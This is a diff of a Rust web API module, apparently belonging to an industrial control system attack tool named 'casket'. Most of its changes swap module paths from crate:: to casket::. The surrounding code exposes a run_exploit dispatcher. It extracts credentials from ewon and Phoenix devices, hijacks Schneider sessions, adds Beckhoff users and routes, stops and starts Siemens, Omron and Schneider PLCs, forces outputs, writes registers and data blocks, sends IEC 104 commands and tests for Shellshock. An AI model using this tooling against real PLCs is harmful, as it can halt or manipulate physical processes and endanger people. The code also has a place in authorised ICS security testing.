@@ -198,7 +198,7 @@ async fn api_interfaces(
     if let Some(err) = require_api_key(&headers, &state.api_key) {
         return err.into_response();
     }
-    let ifaces = tokio::task::spawn_blocking(crate::core::network::get_interfaces)
+    let ifaces = tokio::task::spawn_blocking(casket::core::network::get_interfaces)
         .await
         .unwrap_or_default();
 
@@ -401,7 +401,7 @@ async fn api_scan_ip_inner(req: ScanIpReq, events_tx: broadcast::Sender<DeviceEv
     let timeout = req.timeout.min(60);
 
     let detected = tokio::task::spawn_blocking(move || {
-        crate::core::autodetect::detect_device(&ip, timeout)
+        casket::core::autodetect::detect_device(&ip, timeout)
     })
     .await
     .unwrap_or(None);
@@ -468,7 +468,7 @@ fn broadcast_scan(
     timeout: u64,
     iface_ip: &str,
 ) -> anyhow::Result<Vec<Value>> {
-    use crate::core::network::get_interfaces;
+    use casket::core::network::get_interfaces;
 
     let ifaces = get_interfaces();
     let iface = if iface_ip.is_empty() {
@@ -492,7 +492,7 @@ fn broadcast_scan(
     let scan_mitsubishi = matches!(vendor, "mitsubishi" | "all" | "");
 
     if scan_beckhoff {
-        if let Ok(devs) = crate::vendors::beckhoff::scan::discover(&iface, timeout, true) {
+        if let Ok(devs) = casket::vendors::beckhoff::scan::discover(&iface, timeout, true) {
             for d in devs {
                 devices.push(json!({
                     "ip": d.ip,
@@ -506,7 +506,7 @@ fn broadcast_scan(
     }
 
     if scan_enip {
-        if let Ok(devs) = crate::vendors::enip::scan::scan(&iface, timeout, true) {
+        if let Ok(devs) = casket::vendors::enip::scan::scan(&iface, timeout, true) {
             for d in devs {
                 let v = if matches!(
                     u16::from_str_radix(&d.vendor_id, 16).unwrap_or(0),
@@ -527,7 +527,7 @@ fn broadcast_scan(
     }
 
     if scan_ewon {
-        if let Ok(devs) = crate::vendors::ewon::scan::scan(&iface, timeout, true) {
+        if let Ok(devs) = casket::vendors::ewon::scan::scan(&iface, timeout, true) {
             for d in devs {
                 if let Some(ip) = &d.ip {
                     devices.push(json!({
@@ -543,7 +543,7 @@ fn broadcast_scan(
     }
 
     if scan_schneider {
-        if let Ok(devs) = crate::vendors::schneider::scan::scan(&iface, timeout, true) {
+        if let Ok(devs) = casket::vendors::schneider::scan::scan(&iface, timeout, true) {
             for d in devs {
                 devices.push(json!({
                     "ip": d.ip,
@@ -556,7 +556,7 @@ fn broadcast_scan(
     }
 
     if scan_mitsubishi {
-        if let Ok(devs) = crate::vendors::mitsubishi::scan::scan(&iface, timeout, true) {
+        if let Ok(devs) = casket::vendors::mitsubishi::scan::scan(&iface, timeout, true) {
             for d in devs {
                 devices.push(json!({
                     "ip": d.ip,
@@ -621,13 +621,13 @@ fn read_tags_for_vendor(ip: &str, vendor: &str) -> Value {
 
     match vendor {
         "modicon" | "schneider" | "modbus" => {
-            let port = crate::core::modbus::DEFAULT_PORT;
-            if let Ok(regs) = crate::core::modbus::read_holding_registers(ip, port, 0, 16) {
+            let port = casket::core::modbus::DEFAULT_PORT;
+            if let Ok(regs) = casket::core::modbus::read_holding_registers(ip, port, 0, 16) {
                 for r in regs {
                     tags.insert(format!("hr:{}", r.address), r.raw.into());
                 }
             }
-            if let Ok(coils) = crate::core::modbus::read_coils(ip, port, 0, 16) {
+            if let Ok(coils) = casket::core::modbus::read_coils(ip, port, 0, 16) {
                 for r in coils {
                     tags.insert(format!("coil:{}", r.address), Value::Bool(r.raw != 0));
                 }
@@ -635,7 +635,7 @@ fn read_tags_for_vendor(ip: &str, vendor: &str) -> Value {
         }
         "siemens" => {
             let password = device_field_str(ip, "password");
-            let data = crate::vendors::siemens::s7comm::read_all_data(
+            let data = casket::vendors::siemens::s7comm::read_all_data(
                 ip, 102, 5, password.as_deref(),
             );
             for (area, maybe_bits) in &data {
@@ -657,7 +657,7 @@ fn read_tags_for_vendor(ip: &str, vendor: &str) -> Value {
         }
         // ── Mitsubishi MELSEC: live D-word and M-bit reads ──────────────────
         "mitsubishi" | "slmp" => {
-            use crate::vendors::mitsubishi::slmp;
+            use casket::vendors::mitsubishi::slmp;
             if let Ok(words) = slmp::read_word_devices(ip, 5007, "D", 0, 10) {
                 for v in &words {
                     tags.insert(v.display.clone(), v.raw.into());
@@ -671,7 +671,7 @@ fn read_tags_for_vendor(ip: &str, vendor: &str) -> Value {
         }
         // ── Omron FINS: live DM-word reads ───────────────────────────────────
         "omron" | "fins" => {
-            use crate::vendors::omron::fins;
+            use casket::vendors::omron::fins;
             if let Ok(words) = fins::read_dm_words(ip, 9600, 0, 0, 10) {
                 for (i, val) in words.iter().enumerate() {
                     tags.insert(format!("DM{i}"), (*val).into());
@@ -680,7 +680,7 @@ fn read_tags_for_vendor(ip: &str, vendor: &str) -> Value {
         }
         // ── Rockwell Allen-Bradley: live CIP tag enumerate + bulk read ───────
         "rockwell" | "enip" | "ethernet_ip" => {
-            use crate::vendors::rockwell::driver;
+            use casket::vendors::rockwell::driver;
             if let Ok(all_tags) = driver::enumerate_tags(ip, 44818) {
                 let templates = driver::enumerate_templates(ip, 44818, &all_tags);
                 let display: Vec<&driver::LogixTag> = all_tags
@@ -743,7 +743,7 @@ fn read_tags_for_vendor(ip: &str, vendor: &str) -> Value {
         }
         // ── Phoenix Contact WebVisit: live tag reads via ILRReadValues CGI ───
         "phoenix" | "webvisit" => {
-            use crate::vendors::phoenix::webvisit;
+            use casket::vendors::phoenix::webvisit;
             if let Ok((_, tag_names)) = webvisit::get_tags(ip, 80) {
                 if let Ok(values) = webvisit::read_tag_values(ip, 80, &tag_names) {
                     for (name, val) in values {
@@ -754,7 +754,7 @@ fn read_tags_for_vendor(ip: &str, vendor: &str) -> Value {
         }
         // ── IEC 60870-5-104: General Interrogation → decoded data objects ────
         "iec104" => {
-            use crate::vendors::iec104::client;
+            use casket::vendors::iec104::client;
             if let Ok(mut session) = client::connect(ip, 0) {
                 if let Ok(objects) = client::general_interrogation(&mut session) {
                     for obj in objects {
@@ -765,8 +765,8 @@ fn read_tags_for_vendor(ip: &str, vendor: &str) -> Value {
         }
         // ── Beckhoff ADS: enumerate symbols and read values ───────────────────
         "beckhoff" | "ads" => {
-            use crate::vendors::beckhoff::{ads, scan};
-            use crate::core::network::local_ip_for;
+            use casket::vendors::beckhoff::{ads, scan};
+            use casket::core::network::local_ip_for;
             let local_netid = ads::build_local_netid(&local_ip_for(ip));
             if let Ok(devices) = scan::discover_ip(ip, 3, true) {
                 if let Some(dev) = devices.into_iter().next() {
@@ -784,7 +784,7 @@ fn read_tags_for_vendor(ip: &str, vendor: &str) -> Value {
             let ewon_user = device_field_str(ip, "username");
             let ewon_pass = device_field_str(ip, "password");
             let ewon_creds = ewon_user.as_deref().zip(ewon_pass.as_deref());
-            if let Ok(tag_values) = crate::vendors::ewon::scan::read_tag_values(ip, 80, ewon_creds) {
+            if let Ok(tag_values) = casket::vendors::ewon::scan::read_tag_values(ip, 80, ewon_creds) {
                 for (name, val) in tag_values {
                     tags.insert(name, Value::String(val));
                 }
@@ -792,7 +792,7 @@ fn read_tags_for_vendor(ip: &str, vendor: &str) -> Value {
         }
         // ── SNMP: walk MIB-II system OID tree ────────────────────────────────
         "snmp" => {
-            use crate::vendors::snmp::client;
+            use casket::vendors::snmp::client;
             let community = device_field_str(ip, "community").unwrap_or_else(|| "public".to_string());
             if let Ok(varbinds) = client::walk(ip, 161, &community, ".1.3.6.1.2.1.1") {
                 for (oid, val) in varbinds {
@@ -865,7 +865,7 @@ fn write_rockwell_tag(
     value: &str,
     type_code: Option<u16>,
 ) -> anyhow::Result<()> {
-    use crate::vendors::rockwell::driver;
+    use casket::vendors::rockwell::driver;
 
     let cip_type = type_code.ok_or_else(|| {
         anyhow::anyhow!(
@@ -892,12 +892,12 @@ fn write_tag_for_vendor(
     value: &str,
     type_code: Option<u16>,
 ) -> anyhow::Result<()> {
-    use crate::core::modbus;
+    use casket::core::modbus;
 
     // ── Siemens S7 ───────────────────────────────────────────────────────────
     // Tags displayed as "Q0.0"…"Q0.7" (outputs) and "M0.0"…"M0.7" (merkers).
     if matches!(vendor, "siemens" | "s7") {
-        use crate::vendors::siemens::s7comm;
+        use casket::vendors::siemens::s7comm;
         let (area, byte_idx, bit_idx) = parse_s7_bit_tag(tag).ok_or_else(|| {
             anyhow::anyhow!("Siemens tag must be Q<byte>.<bit> or M<byte>.<bit>, got: {tag}")
         })?;
@@ -914,7 +914,7 @@ fn write_tag_for_vendor(
     // ── Mitsubishi MELSEC ────────────────────────────────────────────────────
     // Tags displayed as "D0"…"D9" (word) and "M0"…"M9" (bit).
     if matches!(vendor, "mitsubishi" | "slmp") {
-        use crate::vendors::mitsubishi::slmp;
+        use casket::vendors::mitsubishi::slmp;
         if let Some(rest) = tag.strip_prefix('D') {
             let addr: u32 = rest
                 .trim()
@@ -940,7 +940,7 @@ fn write_tag_for_vendor(
     // ── Omron FINS ───────────────────────────────────────────────────────────
     // Tags displayed as "DM0"…"DM9" (word).
     if matches!(vendor, "omron" | "fins") {
-        use crate::vendors::omron::fins;
+        use casket::vendors::omron::fins;
         if let Some(rest) = tag.strip_prefix("DM") {
             let addr: u16 = rest
                 .trim()
@@ -959,7 +959,7 @@ fn write_tag_for_vendor(
 
     // ── Phoenix WebVisit ─────────────────────────────────────────────────────
     if matches!(vendor, "phoenix" | "webvisit") {
-        crate::vendors::phoenix::webvisit::write_tag_value(ip, 0, tag, value)?;
+        casket::vendors::phoenix::webvisit::write_tag_value(ip, 0, tag, value)?;
         return Ok(());
     }
 
@@ -1072,7 +1072,7 @@ async fn api_ewon_tags(
         let user = device_field_str(&ip, "username");
         let pass = device_field_str(&ip, "password");
         let creds = user.as_deref().zip(pass.as_deref());
-        crate::vendors::ewon::scan::read_tag_values(&ip, port, creds)
+        casket::vendors::ewon::scan::read_tag_values(&ip, port, creds)
     })
     .await;
     match result {
@@ -1108,7 +1108,7 @@ async fn api_schneider_info(
     let ip = q.ip.clone();
     let port = q.port;
     let result = tokio::task::spawn_blocking(move || {
-        use crate::vendors::schneider::session_hijack;
+        use casket::vendors::schneider::session_hijack;
         let session = session_hijack::get_session_cookie(&ip, port)?;
         session_hijack::get_device_info(&ip, port, &session.cookie_value, "USER")
     })
@@ -1174,7 +1174,7 @@ async fn api_exploit_inner(id: String, req: ExploitReq, events_tx: broadcast::Se
 fn run_exploit(id: &str, ip: &str, username: &str, password: &str) -> anyhow::Result<String> {
     match id {
         "ewon/creds" => {
-            let users = crate::vendors::ewon::exploit::exploit(ip, 0, "adm", 20);
+            let users = casket::vendors::ewon::exploit::exploit(ip, 0, "adm", 20);
             if users.is_empty() {
                 return Ok("No credentials extracted.".into());
             }
@@ -1189,12 +1189,12 @@ fn run_exploit(id: &str, ip: &str, username: &str, password: &str) -> anyhow::Re
         }
 
         "schneider/flash" => {
-            crate::vendors::schneider::flash_led::flash_led_ip(ip)?;
+            casket::vendors::schneider::flash_led::flash_led_ip(ip)?;
             Ok(format!("Flash LED command sent to {ip}."))
         }
 
         "schneider/session_stop" | "schneider/session_run" => {
-            use crate::vendors::schneider::session_hijack;
+            use casket::vendors::schneider::session_hijack;
             let Some(session) = session_hijack::get_session_cookie(ip, 0) else {
                 anyhow::bail!("Could not retrieve session cookie from {ip}");
             };
@@ -1208,7 +1208,7 @@ fn run_exploit(id: &str, ip: &str, username: &str, password: &str) -> anyhow::Re
         }
 
         "phoenix/passwords" => {
-            let entries = crate::vendors::phoenix::webvisit::retrieve_passwords(ip, 0)?;
+            let entries = casket::vendors::phoenix::webvisit::retrieve_passwords(ip, 0)?;
             if entries.is_empty() {
                 return Ok("No passwords found.".into());
             }
@@ -1224,7 +1224,7 @@ fn run_exploit(id: &str, ip: &str, username: &str, password: &str) -> anyhow::Re
         }
 
         "beckhoff/reboot" => {
-            let ok = crate::vendors::beckhoff::webcontrol::reboot(ip, 0)?;
+            let ok = casket::vendors::beckhoff::webcontrol::reboot(ip, 0)?;
             if ok {
                 Ok(format!("Reboot command sent to {ip}."))
             } else {
@@ -1236,7 +1236,7 @@ fn run_exploit(id: &str, ip: &str, username: &str, password: &str) -> anyhow::Re
             if username.is_empty() || password.is_empty() {
                 anyhow::bail!("Username and password are required");
             }
-            let ok = crate::vendors::beckhoff::webcontrol::add_user(ip, 0, username, password)?;
+            let ok = casket::vendors::beckhoff::webcontrol::add_user(ip, 0, username, password)?;
             if ok {
                 Ok(format!("User '{username}' added to {ip}."))
             } else {
@@ -1253,9 +1253,9 @@ fn run_exploit(id: &str, ip: &str, username: &str, password: &str) -> anyhow::Re
                 password.trim().to_ascii_lowercase().as_str(),
                 "false" | "0" | "off"
             );
-            crate::core::modbus::write_single_coil(
+            casket::core::modbus::write_single_coil(
                 ip,
-                crate::core::modbus::DEFAULT_PORT,
+                casket::core::modbus::DEFAULT_PORT,
                 addr,
                 on,
             )?;
@@ -1271,9 +1271,9 @@ fn run_exploit(id: &str, ip: &str, username: &str, password: &str) -> anyhow::Re
                 .trim()
                 .parse()
                 .map_err(|_| anyhow::anyhow!("Invalid register value: '{password}'"))?;
-            crate::core::modbus::write_single_register(
+            casket::core::modbus::write_single_register(
                 ip,
-                crate::core::modbus::DEFAULT_PORT,
+                casket::core::modbus::DEFAULT_PORT,
                 addr,
                 val,
             )?;
@@ -1281,7 +1281,7 @@ fn run_exploit(id: &str, ip: &str, username: &str, password: &str) -> anyhow::Re
         }
 
         "common/shellshock" => {
-            let results = crate::core::shellshock::test_shellshock(ip, 80, 8);
+            let results = casket::core::shellshock::test_shellshock(ip, 80, 8);
             let mut out = String::new();
             let mut any_vuln = false;
             for r in &results {
@@ -1300,7 +1300,7 @@ fn run_exploit(id: &str, ip: &str, username: &str, password: &str) -> anyhow::Re
         }
 
         "common/http_creds" => {
-            match crate::core::httpcreds::test_http_basic(ip, 80, "/", 8, &[]) {
+            match casket::core::httpcreds::test_http_basic(ip, 80, "/", 8, &[]) {
                 Some(r) => Ok(format!(
                     "Valid credentials found: {}:{} (HTTP {})\nPath: {}",
                     r.username, r.password, r.status, r.path
@@ -1310,7 +1310,7 @@ fn run_exploit(id: &str, ip: &str, username: &str, password: &str) -> anyhow::Re
         }
 
         "omron/info" => {
-            use crate::vendors::omron::fins;
+            use casket::vendors::omron::fins;
             let dev = fins::get_device_info_tcp(ip, 9600)?;
             Ok(format!(
                 "Node:    {}\nModel:   {}\nVersion: {}",
@@ -1319,13 +1319,13 @@ fn run_exploit(id: &str, ip: &str, username: &str, password: &str) -> anyhow::Re
         }
 
         "omron/cpu_status" => {
-            use crate::vendors::omron::fins;
+            use casket::vendors::omron::fins;
             let state = fins::get_cpu_state(ip, 9600, 0)?;
             Ok(format!("CPU state: {state}"))
         }
 
         "omron/cpu_run" => {
-            use crate::vendors::omron::fins;
+            use casket::vendors::omron::fins;
             let ok = fins::set_cpu_mode(ip, 9600, 0, true)?;
             if ok {
                 Ok(format!("CPU set to Monitor (Run) mode on {ip}."))
@@ -1335,7 +1335,7 @@ fn run_exploit(id: &str, ip: &str, username: &str, password: &str) -> anyhow::Re
         }
 
         "omron/cpu_stop" => {
-            use crate::vendors::omron::fins;
+            use casket::vendors::omron::fins;
             let ok = fins::set_cpu_mode(ip, 9600, 0, false)?;
             if ok {
                 Ok(format!("CPU set to Stop mode on {ip}."))
@@ -1345,7 +1345,7 @@ fn run_exploit(id: &str, ip: &str, username: &str, password: &str) -> anyhow::Re
         }
 
         "omron/read_dm" => {
-            use crate::vendors::omron::fins;
+            use casket::vendors::omron::fins;
             let start: u16 = username.trim().parse().unwrap_or(0);
             let count: u16 = password.trim().parse().unwrap_or(10).min(100);
             let words = fins::read_dm_words(ip, 9600, 0, start, count)?;
@@ -1357,7 +1357,7 @@ fn run_exploit(id: &str, ip: &str, username: &str, password: &str) -> anyhow::Re
         }
 
         "omron/write_dm" => {
-            use crate::vendors::omron::fins;
+            use casket::vendors::omron::fins;
             let start: u16 = username.trim().parse()
                 .map_err(|_| anyhow::anyhow!("Invalid start address: '{username}'"))?;
             let mut values: Vec<u16> = Vec::new();
@@ -1375,7 +1375,7 @@ fn run_exploit(id: &str, ip: &str, username: &str, password: &str) -> anyhow::Re
         }
 
         "mitsubishi/info" => {
-            use crate::vendors::mitsubishi::scan;
+            use casket::vendors::mitsubishi::scan;
             let devices = scan::scan_ip(ip, 3, true)?;
             if devices.is_empty() {
                 return Ok(format!(
@@ -1397,7 +1397,7 @@ fn run_exploit(id: &str, ip: &str, username: &str, password: &str) -> anyhow::Re
         }
 
         "mitsubishi/read_d" => {
-            use crate::vendors::mitsubishi::slmp;
+            use casket::vendors::mitsubishi::slmp;
             let start: u32 = username.trim().parse().unwrap_or(0);
             let count: u16 = password.trim().parse().unwrap_or(20).min(100);
             let words = slmp::read_word_devices(ip, 5007, "D", start, count)?;
@@ -1409,7 +1409,7 @@ fn run_exploit(id: &str, ip: &str, username: &str, password: &str) -> anyhow::Re
         }
 
         "mitsubishi/read_m" => {
-            use crate::vendors::mitsubishi::slmp;
+            use casket::vendors::mitsubishi::slmp;
             let start: u32 = username.trim().parse().unwrap_or(0);
             let count: u16 = password.trim().parse().unwrap_or(20).min(100);
             let bits = slmp::read_bit_devices(ip, 5007, "M", start, count)?;
@@ -1421,7 +1421,7 @@ fn run_exploit(id: &str, ip: &str, username: &str, password: &str) -> anyhow::Re
         }
 
         "iec104/gi" => {
-            use crate::vendors::iec104::client;
+            use casket::vendors::iec104::client;
             let mut session = client::connect(ip, 2404)?;
             let objects = client::general_interrogation(&mut session)?;
             if objects.is_empty() {
@@ -1435,7 +1435,7 @@ fn run_exploit(id: &str, ip: &str, username: &str, password: &str) -> anyhow::Re
         }
 
         "iec104/sc_on" | "iec104/sc_off" => {
-            use crate::vendors::iec104::client;
+            use casket::vendors::iec104::client;
             let ioa: u32 = username.trim().parse().unwrap_or(1);
             let on = id == "iec104/sc_on";
             let mut session = client::connect(ip, 2404)?;
@@ -1453,7 +1453,7 @@ fn run_exploit(id: &str, ip: &str, username: &str, password: &str) -> anyhow::Re
         }
 
         "siemens/probe_auth" => {
-            use crate::vendors::siemens::s7comm;
+            use casket::vendors::siemens::s7comm;
             if s7comm::probe_auth_required(ip, 102, 5) {
                 Ok(format!("{ip} has S7Comm access protection enabled — a CPU password is required."))
             } else {
@@ -1462,7 +1462,7 @@ fn run_exploit(id: &str, ip: &str, username: &str, password: &str) -> anyhow::Re
         }
 
         "rockwell/identity" => {
-            use crate::vendors::rockwell::driver;
+            use casket::vendors::rockwell::driver;
             let dev = driver::get_device_info(ip, 44818)?;
             Ok(format!(
                 "Vendor:       {}\nProduct Type: {}\nProduct Code: {}\nRevision:     {}\nSerial:       {}\nName:         {}",
@@ -1471,7 +1471,7 @@ fn run_exploit(id: &str, ip: &str, username: &str, password: &str) -> anyhow::Re
         }
 
         "rockwell/list_tags" => {
-            use crate::vendors::rockwell::driver;
+            use casket::vendors::rockwell::driver;
             let all_tags = driver::enumerate_tags(ip, 44818)?;
             let shown: Vec<&driver::LogixTag> = all_tags
                 .iter()
@@ -1489,7 +1489,7 @@ fn run_exploit(id: &str, ip: &str, username: &str, password: &str) -> anyhow::Re
         }
 
         "snmp/sys_info" => {
-            use crate::vendors::snmp::client;
+            use casket::vendors::snmp::client;
             let community = device_field_str(ip, "community").unwrap_or_else(|| "public".to_string());
             let varbinds = client::walk(ip, 161, &community, ".1.3.6.1.2.1.1")?;
             if varbinds.is_empty() {
@@ -1503,7 +1503,7 @@ fn run_exploit(id: &str, ip: &str, username: &str, password: &str) -> anyhow::Re
         }
 
         "snmp/interfaces" => {
-            use crate::vendors::snmp::client;
+            use casket::vendors::snmp::client;
             let community = device_field_str(ip, "community").unwrap_or_else(|| "public".to_string());
             let varbinds = client::walk(ip, 161, &community, ".1.3.6.1.2.1.2")?;
             if varbinds.is_empty() {
@@ -1517,7 +1517,7 @@ fn run_exploit(id: &str, ip: &str, username: &str, password: &str) -> anyhow::Re
         }
 
         "snmp/walk" => {
-            use crate::vendors::snmp::client;
+            use casket::vendors::snmp::client;
             let community = if username.is_empty() { "public" } else { username };
             let oid = if password.is_empty() { ".1.3.6.1.2.1.1" } else { password };
             let varbinds = client::walk(ip, 161, community, oid)?;
@@ -1534,7 +1534,7 @@ fn run_exploit(id: &str, ip: &str, username: &str, password: &str) -> anyhow::Re
         // ── Siemens S7Comm extended exploits ──────────────────────────────────
 
         "siemens/cpu_state" => {
-            use crate::vendors::siemens::s7comm;
+            use casket::vendors::siemens::s7comm;
             let pw = device_field_str(ip, "password");
             let state = s7comm::get_cpu_state(ip, 102, 5, pw.as_deref());
             if state == "Unknown" {
@@ -1544,7 +1544,7 @@ fn run_exploit(id: &str, ip: &str, username: &str, password: &str) -> anyhow::Re
         }
 
         "siemens/io" => {
-            use crate::vendors::siemens::s7comm;
+            use casket::vendors::siemens::s7comm;
             let pw = device_field_str(ip, "password");
             let data = s7comm::read_all_data(ip, 102, 5, pw.as_deref());
             let mut out = String::new();
@@ -1570,7 +1570,7 @@ fn run_exploit(id: &str, ip: &str, username: &str, password: &str) -> anyhow::Re
         }
 
         "siemens/toggle" => {
-            use crate::vendors::siemens::s7comm;
+            use casket::vendors::siemens::s7comm;
             if s7comm::change_cpu_state(ip, 102, 5) {
                 let pw = device_field_str(ip, "password");
                 let new_state = s7comm::get_cpu_state(ip, 102, 5, pw.as_deref());
@@ -1581,7 +1581,7 @@ fn run_exploit(id: &str, ip: &str, username: &str, password: &str) -> anyhow::Re
         }
 
         "siemens/set_outputs" => {
-            use crate::vendors::siemens::s7comm;
+            use casket::vendors::siemens::s7comm;
             let pw = device_field_str(ip, "password");
             let bits = if username.is_empty() { "00000000" } else { username };
             if s7comm::set_outputs(ip, bits, 102, 5, pw.as_deref()) {
@@ -1592,7 +1592,7 @@ fn run_exploit(id: &str, ip: &str, username: &str, password: &str) -> anyhow::Re
         }
 
         "siemens/set_merkers" => {
-            use crate::vendors::siemens::s7comm;
+            use casket::vendors::siemens::s7comm;
             let pw = device_field_str(ip, "password");
             let bits = if username.is_empty() { "00000000" } else { username };
             let offset: u32 = password.trim().parse().unwrap_or(0);
@@ -1604,7 +1604,7 @@ fn run_exploit(id: &str, ip: &str, username: &str, password: &str) -> anyhow::Re
         }
 
         "siemens/list_dbs" => {
-            use crate::vendors::siemens::s7comm;
+            use casket::vendors::siemens::s7comm;
             let pw = device_field_str(ip, "password");
             let blocks = s7comm::list_data_blocks(ip, 102, 5, pw.as_deref());
             if blocks.is_empty() {
@@ -1618,7 +1618,7 @@ fn run_exploit(id: &str, ip: &str, username: &str, password: &str) -> anyhow::Re
         }
 
         "siemens/read_db" => {
-            use crate::vendors::siemens::s7comm;
+            use casket::vendors::siemens::s7comm;
             let pw = device_field_str(ip, "password");
             // username = "db:offset:length"  e.g. "1:0:16"
             let parts: Vec<&str> = username.splitn(3, ':').collect();
@@ -1635,7 +1635,7 @@ fn run_exploit(id: &str, ip: &str, username: &str, password: &str) -> anyhow::Re
         }
 
         "siemens/write_db" => {
-            use crate::vendors::siemens::s7comm;
+            use casket::vendors::siemens::s7comm;
             let pw = device_field_str(ip, "password");
             // username = "db:offset"  password = hex bytes e.g. "deadbeef"
             let parts: Vec<&str> = username.splitn(2, ':').collect();
@@ -1658,8 +1658,8 @@ fn run_exploit(id: &str, ip: &str, username: &str, password: &str) -> anyhow::Re
 
         "siemens/try_defaults" => {
             use crate::creds;
-            use crate::vendors::default_creds;
-            use crate::vendors::siemens::s7comm;
+            use casket::vendors::default_creds;
+            use casket::vendors::siemens::s7comm;
             if !s7comm::probe_auth_required(ip, 102, 5) {
                 return Ok(format!("{ip} has no access protection — no password needed."));
             }
@@ -1688,8 +1688,8 @@ fn run_exploit(id: &str, ip: &str, username: &str, password: &str) -> anyhow::Re
         // ── Beckhoff ADS extended exploits ────────────────────────────────────
 
         "beckhoff/info" => {
-            use crate::core::network::local_ip_for;
-            use crate::vendors::beckhoff::{ads, scan};
+            use casket::core::network::local_ip_for;
+            use casket::vendors::beckhoff::{ads, scan};
             let local_netid = ads::build_local_netid(&local_ip_for(ip));
             let dev = scan::discover_ip_with_port(ip, 3, true, 0)
                 .ok()
@@ -1716,8 +1716,8 @@ fn run_exploit(id: &str, ip: &str, username: &str, password: &str) -> anyhow::Re
         }
 
         "beckhoff/state_run" => {
-            use crate::core::network::local_ip_for;
-            use crate::vendors::beckhoff::{ads, scan};
+            use casket::core::network::local_ip_for;
+            use casket::vendors::beckhoff::{ads, scan};
             let local_netid = ads::build_local_netid(&local_ip_for(ip));
             let dev = scan::discover_ip_with_port(ip, 3, true, 0)
                 .ok()
@@ -1728,8 +1728,8 @@ fn run_exploit(id: &str, ip: &str, username: &str, password: &str) -> anyhow::Re
         }
 
         "beckhoff/state_config" => {
-            use crate::core::network::local_ip_for;
-            use crate::vendors::beckhoff::{ads, scan};
+            use casket::core::network::local_ip_for;
+            use casket::vendors::beckhoff::{ads, scan};
             let local_netid = ads::build_local_netid(&local_ip_for(ip));
             let dev = scan::discover_ip_with_port(ip, 3, true, 0)
                 .ok()
@@ -1740,8 +1740,8 @@ fn run_exploit(id: &str, ip: &str, username: &str, password: &str) -> anyhow::Re
         }
 
         "beckhoff/get_state" => {
-            use crate::core::network::local_ip_for;
-            use crate::vendors::beckhoff::{ads, scan};
+            use casket::core::network::local_ip_for;
+            use casket::vendors::beckhoff::{ads, scan};
             let local_netid = ads::build_local_netid(&local_ip_for(ip));
             let dev = scan::discover_ip_with_port(ip, 3, true, 0)
                 .ok()
@@ -1752,8 +1752,8 @@ fn run_exploit(id: &str, ip: &str, username: &str, password: &str) -> anyhow::Re
         }
 
         "beckhoff/add_route" => {
-            use crate::core::network::local_ip_for;
-            use crate::vendors::beckhoff::{ads, scan};
+            use casket::core::network::local_ip_for;
+            use casket::vendors::beckhoff::{ads, scan};
             let local_ip = local_ip_for(ip);
             let local_netid = ads::build_local_netid(&local_ip);
             let user = if username.is_empty() { "Administrator" } else { username };
@@ -1775,8 +1775,8 @@ fn run_exploit(id: &str, ip: &str, username: &str, password: &str) -> anyhow::Re
         }
 
         "beckhoff/symbols" => {
-            use crate::core::network::local_ip_for;
-            use crate::vendors::beckhoff::{ads, scan};
+            use casket::core::network::local_ip_for;
+            use casket::vendors::beckhoff::{ads, scan};
             let local_netid = ads::build_local_netid(&local_ip_for(ip));
             let dev = scan::discover_ip_with_port(ip, 3, true, 0)
                 .ok()
@@ -1800,8 +1800,8 @@ fn run_exploit(id: &str, ip: &str, username: &str, password: &str) -> anyhow::Re
         }
 
         "beckhoff/write_symbol" => {
-            use crate::core::network::local_ip_for;
-            use crate::vendors::beckhoff::{ads, scan};
+            use casket::core::network::local_ip_for;
+            use casket::vendors::beckhoff::{ads, scan};
             let local_netid = ads::build_local_netid(&local_ip_for(ip));
             if username.is_empty() {
                 anyhow::bail!("Symbol name required in Username field");
@@ -1831,7 +1831,7 @@ fn run_exploit(id: &str, ip: &str, username: &str, password: &str) -> anyhow::Re
         // ── Schneider FC90 exploits ────────────────────────────────────────────
 
         "schneider/fc90_stop" => {
-            use crate::vendors::schneider::modicon_fc90;
+            use casket::vendors::schneider::modicon_fc90;
             let ok = modicon_fc90::stop_plc(ip, 0)?;
             if ok {
                 Ok(format!("PLC STOP sent via FC90 to {ip}."))
@@ -1841,7 +1841,7 @@ fn run_exploit(id: &str, ip: &str, username: &str, password: &str) -> anyhow::Re
         }
 
         "schneider/fc90_start" => {
-            use crate::vendors::schneider::modicon_fc90;
+            use casket::vendors::schneider::modicon_fc90;
             let ok = modicon_fc90::start_plc(ip, 0)?;
             if ok {
                 Ok(format!("PLC START sent via FC90 to {ip}."))
@@ -1851,7 +1851,7 @@ fn run_exploit(id: &str, ip: &str, username: &str, password: &str) -> anyhow::Re
         }
 
         "schneider/fc90_stop_tm221" => {
-            use crate::vendors::schneider::modicon_fc90;
+            use casket::vendors::schneider::modicon_fc90;
             let ok = modicon_fc90::stop_tm221(ip, 0)?;
             if ok {
                 Ok(format!("TM221 STOP sent via FC90 to {ip}."))
@@ -1861,7 +1861,7 @@ fn run_exploit(id: &str, ip: &str, username: &str, password: &str) -> anyhow::Re
         }
 
         "schneider/fc90_start_tm221" => {
-            use crate::vendors::schneider::modicon_fc90;
+            use casket::vendors::schneider::modicon_fc90;
             let ok = modicon_fc90::start_tm221(ip, 0)?;
             if ok {
                 Ok(format!("TM221 START sent via FC90 to {ip}."))
@@ -1871,7 +1871,7 @@ fn run_exploit(id: &str, ip: &str, username: &str, password: &str) -> anyhow::Re
         }
 
         "schneider/fc90_force" => {
-            use crate::vendors::schneider::modicon_fc90::{self, ForceState};
+            use casket::vendors::schneider::modicon_fc90::{self, ForceState};
             // username = output byte (hex 0x11..0x16 or decimal), password = "on"/"off"/"unforce"
             let output_byte: u8 = u8::from_str_radix(
                 username.trim().trim_start_matches("0x"), 16
@@ -1894,7 +1894,7 @@ fn run_exploit(id: &str, ip: &str, username: &str, password: &str) -> anyhow::Re
         // ── Rockwell Allen-Bradley tag read / write ────────────────────────────
 
         "rockwell/read_tag" => {
-            use crate::vendors::rockwell::driver;
+            use casket::vendors::rockwell::driver;
             if username.is_empty() {
                 anyhow::bail!("Tag name required in Username field");
             }
@@ -1911,7 +1911,7 @@ fn run_exploit(id: &str, ip: &str, username: &str, password: &str) -> anyhow::Re
         }
 
         "rockwell/write_tag" => {
-            use crate::vendors::rockwell::driver;
+            use casket::vendors::rockwell::driver;
             if username.is_empty() {
                 anyhow::bail!("Tag name required in Username field; value in Password field");
             }
@@ -1935,7 +1935,7 @@ fn run_exploit(id: &str, ip: &str, username: &str, password: &str) -> anyhow::Re
         // ── IEC 60870-5-104 Double Command ────────────────────────────────────
 
         "iec104/dc" => {
-            use crate::vendors::iec104::client;
+            use casket::vendors::iec104::client;
             // username = IOA address, password = state (1=off, 2=on, 3=indeterminate)
